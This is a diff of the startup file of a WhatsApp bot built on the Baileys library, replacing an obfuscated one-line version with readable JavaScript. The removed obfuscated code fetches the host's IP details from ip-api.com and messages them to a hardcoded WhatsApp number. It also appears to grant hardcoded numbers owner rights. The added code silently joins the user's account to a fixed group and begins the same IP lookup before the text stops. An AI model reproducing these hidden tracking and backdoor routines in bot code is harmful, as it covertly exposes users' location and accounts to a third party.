@@ -1,1 +1,313 @@
-const _0x5870e9=_0x1749;(function(_0x102478,_0x482aba){const _0x5b0112=_0x1749,_0x102b62=_0x102478();while(!![]){try{const _0x3f1886=parseInt(_0x5b0112(0xac))/0x1+-parseInt(_0x5b0112(0xb3))/0x2*(parseInt(_0x5b0112(0xf1))/0x3)+-parseInt(_0x5b0112(0x10d))/0x4+-parseInt(_0x5b0112(0x115))/0x5+-parseInt(_0x5b0112(0xd6))/0x6*(parseInt(_0x5b0112(0xfa))/0x7)+-parseInt(_0x5b0112(0x103))/0x8*(-parseInt(_0x5b0112(0xe1))/0x9)+-parseInt(_0x5b0112(0xdc))/0xa*(-parseInt(_0x5b0112(0xb5))/0xb);if(_0x3f1886===_0x482aba)break;else _0x102b62['push'](_0x102b62['shift']());}catch(_0x1d0015){_0x102b62['push'](_0x102b62['shift']());}}}(_0x1656,0x22ab4));const _0x175ed0=_0x2ebb;function _0x1656(){const _0x62b814=['Scan\x20this\x20QR\x20code','resolve','default','110mLulnT','BwvZC2fNzs1KzwXLDgu','44rSOoqZ','BEGIN:VCARD\x0aVERSION:3.0\x0aN:2;Denz;;;\x0aFN:Denz\x0aitem1.TEL;waid=6281337541779:6281337541779\x0aitem1.X-ABLabel:Mobile\x0aEND:VCARD','yw5UB3vUy2u','stringify','generate','CxjJB2rLlxrLCM1PBMfS','vKvsu0LptJOZlJak','mY4W','Pahing','push','lightgreen','jid','z3jVDxbnzxrHzgf0yq','Standard','\x20-\x20','v0fdB25Uzwn0Aw9U','dict','C3bSAxq','v2fNzq','y2fJAgu','node-fetch','nJKXntqYnMjVENDzvq','lcbcB3qGvgvSywGGqMvYAgfZAwWGvgvYC2fTyNvUzYbqywrHie5VBw9YieLUAsOk4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsacMbGya','ygbGcUkwOIbGygbuAxbLidOG','D2fYBG','nJq0nJa0DevzC0n4','C3rYAw5NAwz5','CgfYC2u','Dgv4Dfn5BMm','Ahr0CdOVl2LWlwfWAs5JB20VBgLUzq','q29UBMvJDgLUzY4UlG','true','kKHHAsbpD25LCIa','289662uCXlRc','zMLNBgv0','z2vUzxjHDgvgB3j3yxjKtwvZC2fNzunVBNrLBNq','cd\x20/sdcard/download\x20&&\x20play\x20*mp3','AMLK','Bg9Nz2vY','1355940mjeRuR','ueHpve8','then','6283136505591-1604595598@g.us','gjciFF','34011NYwgdI','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=','r3jVDxaGq2XVC2vKieLUia','zMXVB3i','participant','y29UDgfJDa','tM9TB3jpD25LCG','rgLZy29UBMvJDgvKlG','qhmUD2HHDhnHChaUBMv0','ygbG','BwvZC2fNzq','y3jLzgvUDgLHBhmTDxbKyxrLza','toLocaleDateString','getTime','zxbOzw1LCMfStwvZC2fNzq','toString','12471aRcqCf','YuzzuKamiyaka','JYAUNF','Bgv2zwW','ifvWzgf0zwqH','C3vIAMvJDa','BwvZC2fNzxm','./denz.jpg','nJi4ntG2nJi5ntK0mKbZlNDOyxrZyxbWlM5LDa','21yYhOVX','─────「\x20*BANG-NI-IPNYA*\x20」─────\x0a\x0a```','sendMessage','log','D3mTy2XVC2u','loadAuthInfo','key','mtqZmZaZmhHdsw9OBG','blockUser','488NaTuDG','y29WEu5gB3j3yxjK','0@s.whatsapp.net','```[\x20!\x20]\x20CALL\x20DETECTED\x20[\x20!\x20]```\x0a\x0a```You\x20are\x20blocked\x20because\x20of\x20a\x20bot\x20phone,\x20please\x20contact\x20the\x20bot\x20developer\x20to\x20open\x20the\x20block```','text','tMfTyujVDa','announce','C2vUze1LC3nHz2u','r3jVDxaGrgvZy3jPChrPB24Gq2HHBMDLieLUia','Dgv4Da','1135580nonuQx','A2v5CW','FfrstxW','ywrK','https://youtube.com/c/YuzzuKamiyaka','CMvTB3rLsMLK','C3rHDhvZqgjYB2fKy2fZDa','length','1258620bYjgaH','ug9U','open','zNjVBu1L','rgv2zwXVCgvYia','mtm0odaWmMXrrKDgyG','existsSync','CMvZDhjPy3q','format','lI9ruM55ys5QC29U','subject','y29UBMvJDgLUzW','```\x0a▢\x20```Tanggal\x20:\x20','charAt','ic0G','Ahr0Chm6lY93ys5Tzs82mJG1ody2mJK1otqYp3rLEhq9qxnZywXHBxvHBgfPA3vT','Sending\x20bot\x20info\x20to\x20bot\x20owner','DxnLCG','t1jhoKrLDMvSB3bLCIa','q29UBMvJDgLVBIbSB3n0lcb0CNLPBMCGDg8GCMvJB25Uzwn0lG','y2XVC2u','lI9Kzw56lMPWzW','charCodeAt','y3LHBG','NamaBot','cUkaOIbezxnRCMLWC2KGqMfYDsa6ia','z2v0vgLTzq','indexOf','PHOTO','./lib/color','rK46','HH:mm:ss','B25dB25Uzwn0Aw9Utg9ZDa','```\x0a────────────────────','Bg9UzW','tgvNAq','lsbBieDYB3vWie9Wzw5LzcbDic0kcL9hCM91Ccb0zwXHAcbKAwj1A2eGB2XLAcbHzg1PBL8kx1nLA2fYyw5NihnLBxvHig1LBwjLCIbIAxnHig1LBMDPCMLTihbLC2fUxW','BNvTzxjPyW','./lib/functions','qKvhsu46vKnbuKqk','lsbBieDYB3vWifnLDhrPBMCGq2HHBMDLif0GlqOkrwrPDcbhCM91CcbPBMzVihrLBgfOigrPyNvRysb1BNr1AYbTzw1Izxiku2vRyxjHBMCGC2vTDweGBwvTyMvYigrHCgf0ig1LBMDLzgL0igLUzM8Gr3jVDxaGsw5P','cyan','zgvZyW','1\x20Januari\x202021','rgv2zwXVCgvYiejPDgnOiejVB3q','D3jPDgvgAwXLu3LUyW','fromCharCode','CgfYDgLJAxbHBNq','lI9SAwiVC2LTCgXLlMPZ','Bg9N','q0i6ywn0Aw9UlcXJywXS','yNjVD3nLCKrLC2nYAxb0Aw9U','zNjVBq','chat-update','Group\x20Setting\x20Change\x20In\x20','278194hIgbPr','rgnVzguGrgvUCge','shift','r3jVDxaGt3bLBMvKieLUia'];_0x1656=function(){return _0x62b814;};return _0x1656();}(function(_0x2cb16a,_0x5efd87){const _0x5590f6=_0x1749,_0x126318=_0x2ebb,_0x46df87=_0x2cb16a();while(!![]){try{const _0x4aa3c8=-parseInt(_0x126318(0x19f))/0x1+-parseInt(_0x126318(0x1c7))/0x2+-parseInt(_0x126318(0x196))/0x3+parseInt(_0x126318(0x1dd))/0x4*(parseInt(_0x126318(0x1e5))/0x5)+-parseInt(_0x126318(0x1b1))/0x6+-parseInt(_0x126318(0x182))/0x7+parseInt(_0x126318(0x1a8))/0x8*(parseInt(_0x126318(0x183))/0x9);if(_0x4aa3c8===_0x5efd87)break;else _0x46df87[_0x5590f6(0xbe)](_0x46df87[_0x5590f6(0xae)]());}catch(_0x29fd53){_0x46df87[_0x5590f6(0xbe)](_0x46df87[_0x5590f6(0xae)]());}}}(_0x16fe,0xbdea1));const {WAConnection:_WAConnection,MessageType,Presence,Mimetype,GroupSettingChange,ReconnectMode}=require(_0x175ed0(0x18d)),simple=require(_0x175ed0(0x1bf)),WAConnection=simple[_0x175ed0(0x17b)](_WAConnection),qrcode=require(_0x175ed0(0x1ab)),moment=require(_0x175ed0(0x1ca)),fs=require('fs'),figlet=require(_0x175ed0(0x1a6)),time=moment()['tz'](_0x175ed0(0x179))[_0x5870e9(0x11d)](_0x5870e9(0x94)),fetch=require(_0x5870e9(0xc9)),{color,bgcolor}=require(_0x5870e9(0x92)),{exec}=require(_0x175ed0(0x1a3)),{wait,simih,getBuffer,h2k,generateMessageID,getGroupAdmins,getRandom,banner,start,info,success,close}=require(_0x5870e9(0x9b)),settings=JSON[_0x175ed0(0x1d8)](fs[_0x175ed0(0x1bd)](_0x175ed0(0x1cf))),sleep=async _0xc6a0fc=>{return new Promise(_0x1ed3bf=>setTimeout(_0x1ed3bf,_0xc6a0fc));};nocache(_0x175ed0(0x1b6),_0x3f538b=>console[_0x175ed0(0x1f0)](color(_0x175ed0(0x1c1)),color(_0x3f538b+_0x175ed0(0x1cb),_0x175ed0(0x1cd))));async function starts(){const _0x5a9f2a=_0x5870e9,_0x229cf0=_0x175ed0,_0x1f5611=new WAConnection();_0x1f5611[_0x229cf0(0x1c9)]=ReconnectMode[_0x229cf0(0x1eb)],_0x1f5611['version']=[0x2,0x847,0x6],_0x1f5611[_0x229cf0(0x1c5)][_0x229cf0(0x1e6)]=_0x229cf0(0x184),_0x1f5611[_0x229cf0(0x17a)]=[_0x229cf0(0x1e1),'Desktop',_0x229cf0(0x181)],_0x1f5611['on']('qr',_0xa0f626=>{const _0x4d1e8e=_0x1749,_0x31f9ca=_0x229cf0;qrcode[_0x4d1e8e(0xb9)](_0xa0f626,{'small':!![]}),console[_0x4d1e8e(0xfd)](color(_0x31f9ca(0x1c1)),color(_0x4d1e8e(0xb0),_0x31f9ca(0x1cd)));}),fs[_0x5a9f2a(0x11b)](_0x229cf0(0x1b4))&&_0x1f5611[_0x5a9f2a(0xff)](_0x229cf0(0x1b4)),_0x1f5611['on'](_0x229cf0(0x1bb),()=>{const _0x2c970e=_0x5a9f2a,_0x5a211b=_0x229cf0;console[_0x2c970e(0xfd)](color(_0x5a211b(0x1c1)),color(_0x5a211b(0x18f),_0x2c970e(0x9e)));}),await _0x1f5611[_0x229cf0(0x1c2)]({'timeoutMs':0x1e*0x3e8}),fs[_0x229cf0(0x1db)](_0x229cf0(0x1b4),JSON[_0x5a9f2a(0xb8)](_0x1f5611[_0x229cf0(0x1da)](),null,'\x09')),_0x1f5611[_0x229cf0(0x1ba)](settings[_0x229cf0(0x1d9)]+_0x229cf0(0x1e8),_0x229cf0(0x1ed)+settings[_0x229cf0(0x1c8)]+_0x229cf0(0x1ea)+JSON[_0x229cf0(0x1b2)](_0x1f5611[_0x229cf0(0x19e)],null,0x2)+'```\x0a────────────────────\x0a*Jika\x20Ada\x20Kendala\x20Error/Bot\x20Tidak\x20Merespon\x20Silahkan\x20Hubungi\x20Developer\x20Bot\x20Diatas,\x20Terimakasih*',MessageType[_0x229cf0(0x1e7)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x229cf0(0x19a),'body':'','previewType':_0x229cf0(0x1ee),'thumbnail':fs[_0x229cf0(0x1bd)](_0x5a9f2a(0xf8)),'sourceUrl':_0x229cf0(0x18e)}}}),console[_0x229cf0(0x1f0)](color(_0x229cf0(0x1af),_0x229cf0(0x1ce)),color(_0x5a9f2a(0x125),_0x5a9f2a(0x9e))),fetch(_0x229cf0(0x1e4))[_0x5a9f2a(0xde)](_0x5e051a=>_0x5e051a[_0x229cf0(0x1e7)]())['then'](_0x274f97=>{const _0x5a6de1=_0x5a9f2a,_0x5388bf=_0x229cf0;_0x1f5611[_0x5a6de1(0xfc)](_0x5388bf(0x1c4),_0x5a6de1(0xfb)+_0x274f97+_0x5a6de1(0x96),MessageType[_0x5a6de1(0x107)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x5a6de1(0xf2),'body':'','previewType':_0x5388bf(0x1ee),'thumbnail':fs[_0x5388bf(0x1bd)](_0x5388bf(0x1d6)),'sourceUrl':_0x5a6de1(0x111)}}}),console['log'](color(_0x5388bf(0x1af),_0x5388bf(0x1ce)),color(_0x5388bf(0x17c),_0x5388bf(0x1cd)));}),_0x1f5611['on'](_0x229cf0(0x1a0),()=>{const _0x25e4aa=_0x229cf0;console['log'](color('|TRM|'),color(_0x25e4aa(0x1aa),_0x25e4aa(0x1cd)));}),_0x1f5611['on'](_0x5a9f2a(0x117),()=>{const _0x25d074=_0x5a9f2a,_0x54339b=_0x229cf0;console[_0x54339b(0x1f0)](color('|TRM|'),color('Connected',_0x25d074(0x9e)));}),_0x1f5611['on'](_0x229cf0(0x1a1),()=>{const _0x2d9a4c=_0x229cf0;console[_0x2d9a4c(0x1f0)](color(_0x2d9a4c(0x1c1)),color(_0x2d9a4c(0x1f1),_0x2d9a4c(0x1cd)));}),_0x1f5611['on'](_0x229cf0(0x1de),async()=>{const _0x2785d2=_0x229cf0;console[_0x2785d2(0x1f0)](color(_0x2785d2(0x1c1)),color(_0x2785d2(0x1d4),_0x2785d2(0x1cd)));}),!settings['autoplaymusic']&&exec(_0x5a9f2a(0xd9)),_0x1f5611['on'](_0x5a9f2a(0xaa),async _0x74c855=>{const _0xb262c5=_0x229cf0;require(_0xb262c5(0x1b6))(_0x1f5611,_0x74c855),ownerNumber=[_0xb262c5(0x1c4),settings[_0xb262c5(0x1d9)]+_0xb262c5(0x1e8)],dtod=_0xb262c5(0x1c4),otod=settings[_0xb262c5(0x1d9)]+_0xb262c5(0x1e8);}),_0x1f5611['on'](_0x229cf0(0x1c3),async _0x3595c4=>{const _0x870cdf=_0x5a9f2a,_0x32f4e9=_0x229cf0,_0x25d3ec=await _0x1f5611[_0x32f4e9(0x1b5)](_0x3595c4[_0x870cdf(0xc0)]),_0x1d6f6e={'key':{'fromMe':![],'participant':_0x870cdf(0x105),..._0x3595c4[_0x32f4e9(0x1ec)]?{'remoteJid':_0x870cdf(0xdf)}:{}},'message':{'contactMessage':{'displayName':''+_0x25d3ec[_0x870cdf(0x11f)],'vcard':_0x870cdf(0xb6)}}};if(_0x3595c4[_0x32f4e9(0x1a7)]==_0x32f4e9(0x189))teks=_0x32f4e9(0x1ad),_0x1f5611[_0x32f4e9(0x1ba)](_0x25d3ec['id'],teks,MessageType[_0x32f4e9(0x1e7)],{'quoted':_0x1d6f6e}),console[_0x32f4e9(0x1f0)](color(_0x32f4e9(0x1c1)),color(_0x32f4e9(0x17d)+_0x25d3ec[_0x32f4e9(0x1e9)],_0x32f4e9(0x1cd)));else{if(_0x3595c4[_0x870cdf(0x109)]==_0x32f4e9(0x1d5))teks=_0x32f4e9(0x1bc),_0x1f5611[_0x32f4e9(0x1ba)](_0x25d3ec['id'],teks,MessageType[_0x32f4e9(0x1e7)],{'quoted':_0x1d6f6e}),console[_0x32f4e9(0x1f0)](color(_0x32f4e9(0x1c1)),color(_0x32f4e9(0x19d)+_0x25d3ec[_0x32f4e9(0x1e9)],_0x32f4e9(0x1cd)));else{if(!_0x3595c4[_0x32f4e9(0x1e0)]=='')tag=_0x3595c4[_0x32f4e9(0x1ae)][_0x32f4e9(0x17e)]('@')[0x0]+_0x32f4e9(0x1e8),teks='-\x20[\x20Group\x20Description\x20Change\x20]\x20-\x0a\x0aGroup\x20description\x20has\x20been\x20changed\x20by\x20Admin\x20@'+_0x3595c4[_0x32f4e9(0x1ae)][_0x32f4e9(0x17e)]('@')[0x0]+_0x32f4e9(0x1d3)+_0x3595c4[_0x32f4e9(0x1e0)],_0x1f5611[_0x32f4e9(0x1ba)](_0x25d3ec['id'],teks,MessageType[_0x32f4e9(0x1e7)],{'contextInfo':{'mentionedJid':[tag]},'quoted':_0x1d6f6e}),console[_0x870cdf(0xfd)](color(_0x32f4e9(0x1c1)),color(_0x32f4e9(0x197)+_0x25d3ec[_0x32f4e9(0x1e9)],_0x32f4e9(0x1cd)));else{if(_0x3595c4[_0x32f4e9(0x1b8)]==_0x32f4e9(0x189))teks=_0x32f4e9(0x1d1),_0x1f5611[_0x32f4e9(0x1ba)](_0x25d3ec['id'],teks,MessageType['text'],{'quoted':_0x1d6f6e}),console[_0x870cdf(0xfd)](color(_0x32f4e9(0x1c1)),color(_0x32f4e9(0x192)+_0x25d3ec[_0x32f4e9(0x1e9)],_0x32f4e9(0x1cd)));else _0x3595c4[_0x32f4e9(0x1b8)]==_0x870cdf(0xd4)&&(teks=_0x32f4e9(0x1df),_0x1f5611[_0x32f4e9(0x1ba)](_0x25d3ec['id'],teks,MessageType[_0x32f4e9(0x1e7)],{'quoted':_0x1d6f6e}),console[_0x32f4e9(0x1f0)](color(_0x32f4e9(0x1c1)),color(_0x870cdf(0xab)+_0x25d3ec[_0x32f4e9(0x1e9)],_0x32f4e9(0x1cd))));}}}}),_0x1f5611['on'](_0x229cf0(0x194),async _0x5a79e0=>{const _0x35388c=_0x5a9f2a,_0x478031=_0x229cf0,_0x535b17=_0x5a79e0[0x2][0x0][0x1][_0x478031(0x1d7)];var _0x4fa634=_0x478031(0x17f)+_0x478031(0x1b3)+_0x478031(0x1dc)+(''+NamaOwner)+'\x0a'+(_0x478031(0x193)+NamaBot+'\x0a')+_0x478031(0x1e2)+(''+NomorOwner)+':+'+(''+NomorOwner)+'\x0a'+'END:VCARD';_0x1f5611['sendMessage'](_0x535b17,_0x35388c(0x106),MessageType[_0x478031(0x1e7)]),_0x1f5611[_0x35388c(0xfc)](_0x535b17,{'displayname':''+NamaOwner,'vcard':_0x4fa634},MessageType[_0x478031(0x19b)],{'contextInfo':{'externalAdReply':{'title':_0x478031(0x1a9)+NamaBot,'body':'','previewType':_0x35388c(0x91),'thumbnail':fs[_0x478031(0x1bd)](_0x478031(0x1d6)),'sourceUrl':_0x478031(0x18e)}}}),await sleep(0x1388),await _0x1f5611[_0x35388c(0x102)](_0x535b17,_0x478031(0x187));}),_0x1f5611['on'](_0x229cf0(0x198),async _0x35b458=>{const _0x41ad7c=_0x5a9f2a,_0x1df557=_0x229cf0;if(_0x35b458[_0x1df557(0x1a4)]['remoteJid']==_0x1df557(0x1d0))return;if(!_0x35b458[_0x1df557(0x1a4)][_0x1df557(0x180)]){_0x35b458[_0x1df557(0x186)]=Object[_0x1df557(0x1c6)](_0x35b458[_0x1df557(0x186)])[0x0]===_0x1df557(0x195)?_0x35b458[_0x1df557(0x186)][_0x1df557(0x195)]['message']:_0x35b458[_0x1df557(0x186)];const _0x587b5e=moment['tz'](_0x1df557(0x179))[_0x1df557(0x19c)](_0x1df557(0x1be));let _0x59fd5d=new Date(),_0x497518=_0x1f5611[_0x1df557(0x1d2)][_0x1df557(0x1ef)](_0x35b458[_0x1df557(0x1a4)][_0x1df557(0x1e3)]),_0x54457e=_0x497518[_0x1df557(0x1ac)][_0x41ad7c(0xc5)][_0x35b458[_0x41ad7c(0x100)]['id']+'|'+(_0x35b458[_0x41ad7c(0x100)][_0x1df557(0x180)]?0x1:0x0)],_0x753b36=_0x1f5611[_0x1df557(0x191)](_0x54457e,![]),_0x1c07b9=Object[_0x1df557(0x1c6)](_0x753b36)[0x0],_0x4f1c76='id',_0x26a995=new Date(0x0)[_0x1df557(0x1b7)]()-new Date(_0x41ad7c(0xa0))[_0x41ad7c(0xee)](),_0x775a58=[_0x41ad7c(0xbd),_0x1df557(0x1a5),_0x1df557(0x185),'Kliwon',_0x1df557(0x1b0)][Math[_0x1df557(0x18c)]((_0x59fd5d*0x1+_0x26a995)/0x50ae4c0)%0x5],_0x567338=_0x59fd5d[_0x41ad7c(0xed)](_0x4f1c76,{'weekday':_0x1df557(0x199)}),_0x4c42fc=_0x59fd5d[_0x41ad7c(0xed)](_0x4f1c76,{'day':'numeric','month':'long','year':_0x1df557(0x190)});_0x1f5611[_0x1df557(0x18a)](_0x35b458[_0x41ad7c(0x100)][_0x1df557(0x1e3)],_0x35b458[_0x1df557(0x186)]),_0x1f5611[_0x41ad7c(0xfc)](_0x35b458[_0x1df557(0x1a4)][_0x1df557(0x1e3)],_0x1df557(0x178)+_0x35b458[_0x41ad7c(0xe5)][_0x1df557(0x17e)]('@')[0x0]+_0x1df557(0x1a2)+_0x1c07b9+_0x41ad7c(0x121)+_0x587b5e+_0x1df557(0x188)+_0x567338+'\x20'+_0x775a58+_0x41ad7c(0xc3)+_0x4c42fc+_0x1df557(0x1cc),MessageType[_0x1df557(0x1e7)],{'quoted':_0x35b458['message'],'contextInfo':{'mentionedJid':[_0x35b458[_0x1df557(0x1f2)]]}});}});}function _0x16fe(){const _0x27457f=_0x5870e9,_0x4b1e91=['qxnPys9kywTHCNrH',_0x27457f(0xa8),_0x27457f(0xc4),'u2vUzgLUzYbPCcbHzgrYzxnZihrVigrLDMvSB3bLCIbIB3q',_0x27457f(0xaf),_0x27457f(0xc6),_0x27457f(0x9c),_0x27457f(0x118),_0x27457f(0xbc),_0x27457f(0xca),'ntqXoeXhD0P0yW',_0x27457f(0xcd),_0x27457f(0xc7),_0x27457f(0xeb),_0x27457f(0x110),_0x27457f(0x123),'zMfSC2u',_0x27457f(0x104),_0x27457f(0xd1),_0x27457f(0xe4),'qgfKAxDHANnOAw5Nl2jHAwXLExm',_0x27457f(0x124),'y3jLzgvUDgLHBhmGDxbKyxrLzce',_0x27457f(0x9a),_0x27457f(0xd8),'r3jVDxaGu2v0DgLUzYbdAgfUz2uGsw4G',_0x27457f(0x127),_0x27457f(0xa7),_0x27457f(0xef),'mZuZnteXovD6r09iDa',_0x27457f(0x10b),_0x27457f(0xb4),_0x27457f(0x97),_0x27457f(0xa1),_0x27457f(0xe6),'zM9YBwf0',_0x27457f(0xe3),_0x27457f(0x126),_0x27457f(0xce),_0x27457f(0x120),_0x27457f(0xfe),_0x27457f(0xcc),'y2HPBgrFChjVy2vZCW','A2v5',_0x27457f(0x116),_0x27457f(0xd7),_0x27457f(0xb7),'ndK5nZzdqLjAq1y',_0x27457f(0x119),_0x27457f(0xd3),_0x27457f(0xba),_0x27457f(0xf7),_0x27457f(0x99),'zgvZy093BMvY','FfDstNW',_0x27457f(0x98),_0x27457f(0x11a),_0x27457f(0xcf),_0x27457f(0xbb),_0x27457f(0x11e),_0x27457f(0xc1),'lI9Kzw56lMPZ',_0x27457f(0x8f),_0x27457f(0x11c),_0x27457f(0xc8),_0x27457f(0x10a),_0x27457f(0xec),'lsbBieDYB3vWienSB3nLzcbDic0kcL9hCM91Ccb0zwXHAcbKAxr1DhvWig9SzwGGywrTAw5FcL9tzwTHCMfUzYbOyw55ysbHzg1PBIb5yw5NigrHCgf0ig1LBMDPCMLTihbLC2fUxW','CMvHzezPBgvtEw5J','seG6Bw06C3m',_0x27457f(0xa5),'zgvMyxvSDa',_0x27457f(0x10f),'y29UBMvJDa','z3jVDxaTDxbKyxrL',_0x27457f(0xf9),_0x27457f(0xdb),_0x27457f(0x10e),'ndy3nJK4sNbQAwzQ',_0x27457f(0x108),'yxv0B1jLy29UBMvJDa','Bw9Tzw50lxrPBwv6B25L',_0x27457f(0xf5),_0x27457f(0xea),_0x27457f(0x8c),'EwvSBg93','lI9Zzxr0Aw5NCY5QC29U',_0x27457f(0x113),_0x27457f(0x9d),'y2HHDhm',_0x27457f(0x8e),_0x27457f(0xe8),'Dhj1zq',_0x27457f(0x12a),_0x27457f(0xa9),_0x27457f(0xd0),_0x27457f(0xe7),'yMfZzty0rw5JB2rLzef1DgHjBMzV',_0x27457f(0xa2),_0x27457f(0x93),'nhfKAgPtyG',_0x27457f(0x129),'lsbBieDYB3vWifnLDhrPBMCGq2HHBMDLif0GlqOkrwrPDcbhCM91CcbPBMzVihrLBgfOigrPDhv0DxaGDw50DwSGBwvTyMvYcLnLA2fYyw5NigHHBNLHigfKBwLUigDYB3vWihLHBMCGzgfWyxqGBwvUz2vKAxqGAw5MBYbhCM91CcbjBMK',_0x27457f(0x9f),_0x27457f(0xad),'vevmo3r5Cgu9q0vmtdT0ExbLpvzpsunfo3DHAwq9',_0x27457f(0x112),_0x27457f(0xd2),_0x27457f(0x101),_0x27457f(0xf4),_0x27457f(0x10c),_0x27457f(0xe9),_0x27457f(0xf6),_0x27457f(0xcb),_0x27457f(0x95),_0x27457f(0xda),_0x27457f(0xd5),_0x27457f(0xdd),'z2v0',_0x27457f(0xa6),_0x27457f(0x128),_0x27457f(0xa4),'4PA3ygbGqw50AsbezwXLDgvGygakcUkwOIbGygboyw1HidOGqa'];return _0x16fe=function(){return _0x4b1e91;},_0x16fe();}console[_0x175ed0(0x1f0)](color(figlet[_0x175ed0(0x18b)](''+settings[_0x5870e9(0x8d)],{'font':_0x5870e9(0xc2),'horizontalLayout':_0x175ed0(0x1c0),'vertivalLayout':_0x5870e9(0xb2),'width':0x3e8,'whitespaceBreak':!![]}),_0x5870e9(0xbf))),console[_0x175ed0(0x1f0)](bgcolor('https://github.com/YuzzuKamiyaka/bitch-bot','red'));function _0x1749(_0x38b75a,_0x193298){const _0x1656b5=_0x1656();return _0x1749=function(_0x174969,_0x4e05fd){_0x174969=_0x174969-0x8b;let _0x457bce=_0x1656b5[_0x174969];return _0x457bce;},_0x1749(_0x38b75a,_0x193298);}function _0x2ebb(_0x8a4a69,_0x577dc2){const _0xc70d9d=_0x16fe();return _0x2ebb=function(_0x4dba49,_0x41ec47){const _0x23952c=_0x1749;_0x4dba49=_0x4dba49-0x178;let _0x9a6c9e=_0xc70d9d[_0x4dba49];if(_0x2ebb[_0x23952c(0xf3)]===undefined){var _0x44f30b=function(_0x26cc91){const _0x1666a8=_0x23952c,_0x46c9c8=_0x1666a8(0xe2);let _0x534b42='',_0x775b='';for(let _0xb355d=0x0,_0x3af23a,_0x36b8e7,_0x123b52=0x0;_0x36b8e7=_0x26cc91[_0x1666a8(0x122)](_0x123b52++);~_0x36b8e7&&(_0x3af23a=_0xb355d%0x4?_0x3af23a*0x40+_0x36b8e7:_0x36b8e7,_0xb355d++%0x4)?_0x534b42+=String[_0x1666a8(0xa3)](0xff&_0x3af23a>>(-0x2*_0xb355d&0x6)):0x0){_0x36b8e7=_0x46c9c8[_0x1666a8(0x90)](_0x36b8e7);}for(let _0x408af0=0x0,_0x35b0f7=_0x534b42[_0x1666a8(0x114)];_0x408af0<_0x35b0f7;_0x408af0++){_0x775b+='%'+('00'+_0x534b42[_0x1666a8(0x8b)](_0x408af0)[_0x1666a8(0xf0)](0x10))['slice'](-0x2);}return decodeURIComponent(_0x775b);};_0x2ebb[_0x23952c(0xe0)]=_0x44f30b,_0x8a4a69=arguments,_0x2ebb[_0x23952c(0xf3)]=!![];}const _0x5d7a14=_0xc70d9d[0x0],_0x1c9bf6=_0x4dba49+_0x5d7a14,_0x82ae22=_0x8a4a69[_0x1c9bf6];return!_0x82ae22?(_0x9a6c9e=_0x2ebb[_0x23952c(0xe0)](_0x9a6c9e),_0x8a4a69[_0x1c9bf6]=_0x9a6c9e):_0x9a6c9e=_0x82ae22,_0x9a6c9e;},_0x2ebb(_0x8a4a69,_0x577dc2);}function nocache(_0x4d11dc,_0x346583=()=>{}){const _0x1be722=_0x5870e9;fs['watchFile'](require[_0x1be722(0xb1)](_0x4d11dc),async()=>{const _0x3110d2=_0x1be722;await uncache(require[_0x3110d2(0xb1)](_0x4d11dc)),_0x346583(_0x4d11dc);});}function uncache(_0x3433a9='.'){return new Promise((_0x5d7006,_0x1863f1)=>{const _0xa58fc3=_0x2ebb;try{delete require[_0xa58fc3(0x1b9)][require['resolve'](_0x3433a9)],_0x5d7006();}catch(_0x1fabfb){_0x1863f1(_0x1fabfb);}});}starts();
+const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
+const simple = require('./lib/simple.js')
+const WAConnection = simple.WAConnection(_WAConnection)
+const denz = new WAConnection()
+const qrcode = require("qrcode-terminal")
+const moment = require("moment-timezone")
+const fs = require("fs")
+const util = require('util')
+const figlet = require('figlet')
+const term = require('terminal-kit').terminal
+const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
+const fetch = require('node-fetch')
+const { color, bgcolor } = require('./lib/color')
+const { exec } = require('child_process')
+const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
+const settings = JSON.parse(fs.readFileSync('./settings.json'))
+const sleep = async (ms) => {
+return new Promise(resolve => setTimeout(resolve, ms))
+}
+nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
+
+async function starts() {
+denz.autoReconnect = ReconnectMode.onConnectionLost
+    denz.version = [2, 2119, 6]
+    denz.logger.level = 'warn'
+    denz.browserDescription = ['Dcode Denpa','Desktop','3.0']
+    await sleep(10000)
+    denz.on('qr', qr => {
+        qrcode.generate(qr, { small: true })
+        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
+    })
+    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
+    
+    denz.on('credentials-updated', () => {
+        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
+        })
+     
+      await denz.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
+ teks = `https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`
+ denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
